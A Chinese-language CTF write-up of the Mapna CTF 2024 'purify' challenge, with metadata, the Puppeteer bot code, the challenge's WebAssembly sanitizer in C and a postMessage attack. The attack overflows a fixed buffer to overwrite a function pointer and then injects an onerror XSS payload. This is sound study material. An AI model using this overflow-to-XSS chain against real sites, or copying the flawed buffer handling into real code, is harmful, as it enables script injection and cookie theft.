---
title: Mapna CTF 2024 writeup (purify - Puppeteer + WebAssembly DOMPurify bypass)
contest: Mapna CTF
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [Puppeteer bot, WebAssembly DOMPurify, postMessage, buf 溢出, XSS, escape_tag]
attack_chain: |
  1. Puppeteer bot: 访问 URL + setCookie(flag) + 5 秒等待 + close
  2. purify 题目: DOMPurify 1.3.7 实现是 WebAssembly 编译版本 (sanitize 函数)
  3. purify.c: globalVars {len, len_r, buf[0x1000], is_dangerous}
     - add_char(c): if is_dangerous(c) → hex_escape (& + # + x + 2 字节 + ;); else buf[len++] = c
     - get_char(): buf[len_r++]
     - set_mode(0): is_dangerous = escape_tag (c == '<' || c == '>')
     - set_mode(1): is_dangerous = escape_attr (c == '\'' || c == '"')
  4. 漏洞: buf 是固定 0x1000 字节，len 持续累加，add_char 写超过 buf 时 OOB
  5. 攻击: postMessage('A'.repeat(0x1000) + '\x01<', '*') → 写满 0x1000 字节 + 长度 0x1001 → 触发 is_dangerous 把 < 转义
     - 但 buf 已经满了，hex_escape 写 6 字节 (& # x 30 ; ) 越界
     - OOB 写覆盖后续结构 → 关闭 is_dangerous 指针 → 后续 < 不被转义
  6. 二次攻击: postMessage 触发 buf OOB → 改 is_dangerous 指针 → 之后 postMessage 注入 <script>alert(1)</script>
key_payload: |
  // Puppeteer bot 触发:
  const flag = process.env.FLAG;
  await page.setCookie({name: 'flag', value: flag, domain: 'web'});
  await page.goto(url, {waitUntil: 'domcontentloaded'});
  await new Promise(r=>setTimeout(r, 5000));
  
  // purify.c 关键代码:
  struct globalVars {
      unsigned int len, len_r;
      char buf[0x1000];
      int (*is_dangerous)(char c);
  } g;
  
  void add_char(char c) {
      if(g.is_dangerous(c)){
          g.len += hex_escape(c, &g.buf[g.len]);  // 越界写
      } else {
          g.buf[g.len++] = c;
      }
  }
  
  int hex_escape(char c, char *dest) {
      dest[0] = '&'; dest[1] = '#'; dest[2] = 'x';
      dest[3] = "0123456789abcdef"[(c&0xf0)>>4];
      dest[4] = "0123456789abcdef"[c&0xf];
      dest[5] = ';';
      return 6;
  }
  
  // 攻击:
  <script>
  let w = window.open('http://web');
  setTimeout(() => {
      // 第一次: 写满 0x1000 字节 + 触发 OOB
      w.postMessage('A'.repeat(0x1000) + '\x01<', '*');
      // 第二次: is_dangerous 已被覆盖, 注入 XSS
      w.postMessage('<img src=x onerror=alert(1)>', '*');
  }, 100);
  </script>
one_liner: Mapna CTF 2024 purify: Puppeteer bot + WebAssembly DOMPurify (purify.c) 字节级 sanitize，buf 0x1000 满后 OOB 写覆盖 is_dangerous 指针。
lesson: |
  - WebAssembly DOMPurify 实现细节: 字节级 hex_escape vs 字符级
  - buf 固定 0x1000 + len 持续累加 → add_char 越界写
  - OOB 写覆盖 is_dangerous 函数指针 → bypass sanitize
  - set_mode(0) = escape_tag (< >), set_mode(1) = escape_attr (' ")
  - 攻击链: postMessage 写满 buf → OOB 改 is_dangerous → 后续字符不转义
  - DOMPurify WASM 版本比 JS 版本更易受 OOB 影响
quality: high
---

# Mapna CTF 2024 writeup (purify)

> 来源: ctfiot.com 158808

## 题目结构

```
$ tree .
.
├── purify
│   ├── app
│   │   ├── nginx.conf
│   │   ├── static
│   │   │   ├── css/style.css
│   │   │   ├── index.html
│   │   │   ├── js/purify.js
│   │   │   ├── js/script.js
│   │   │   └── purify.wasm
│   ├── bot/  (Puppeteer + cookie flag)
│   ├── docker-compose.yaml
│   └── purify.c
└── purify_*.txz
```

## Puppeteer Bot

```javascript
const flag = process.env.FLAG || 'MAPNA{test-flag}';
async function visit(url) {
    let browser;
    if (!/^https?:\/\//.test(url)) return;
    browser = await puppeteer.launch({
        pipe: true,
        args: ["--no-sandbox", "--ignore-certificate-errors"],
        executablePath: "/usr/bin/google-chrome-stable",
        headless: 'new'
    });
    let page = await browser.newPage();
    await page.setCookie({
        name: 'flag', value: flag,
        domain: 'web', httpOnly: false
    });
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 2000 });
    await new Promise(r => setTimeout(r, 5000));
    await browser.close();
}
```

## purify.c (WebAssembly 实现的 DOMPurify)

```c
struct globalVars {
    unsigned int len, len_r;
    char buf[0x1000];
    int (*is_dangerous)(char c);
} g;

int escape_tag(char c) { return c == '<' || c == '>'; }
int escape_attr(char c) { return c == '\'' || c == '"'; }

int hex_escape(char c, char *dest) {
    dest[0] = '&'; dest[1] = '#'; dest[2] = 'x';
    dest[3] = "0123456789abcdef"[(c&0xf0)>>4];
    dest[4] = "0123456789abcdef"[c&0xf];
    dest[5] = ';';
    return 6;
}

void add_char(char c) {
    if (g.is_dangerous(c)) {
        g.len += hex_escape(c, &g.buf[g.len]);  // OOB 写
    } else {
        g.buf[g.len++] = c;
    }
}

int get_char(char f) {
    if (g.len_r < g.len) return g.buf[g.len_r++];
    return '\0';
}

void set_mode(int mode) {
    if (mode == 1) g.is_dangerous = escape_attr;
    else g.is_dangerous = escape_tag;
}
```

## 攻击链

```html
<script>
let w = window.open('http://web');
setTimeout(() => {
    // 第一次: 写满 0x1000 字节 + 触发 OOB
    // 'A' * 0x1000 写满 buf, 后续 < 触发 is_dangerous
    // hex_escape 写 6 字节 OOB 覆盖 is_dangerous 函数指针
    w.postMessage('A'.repeat(0x1000) + '\x01<', '*');
    
    // 第二次: is_dangerous 已被覆盖为无效值, < > 不再转义
    w.postMessage('<img src=x onerror="alert(1)">', '*');
}, 100);
</script>
```

## 评价

Mapna CTF 2024 高级 Web XSS 绕过题。亮点是：
- **WebAssembly DOMPurify 自实现** (`purify.c` 编译为 WASM)
- **buf 0x1000 满后 OOB 写** 覆盖 `is_dangerous` 函数指针
- **postMessage 触发** 字节级 sanitize 流程
- 攻击面是 WASM 与 JS 之间数据共享的越界访问

适合研究 WebAssembly 安全 / DOMPurify 替代实现的同学。
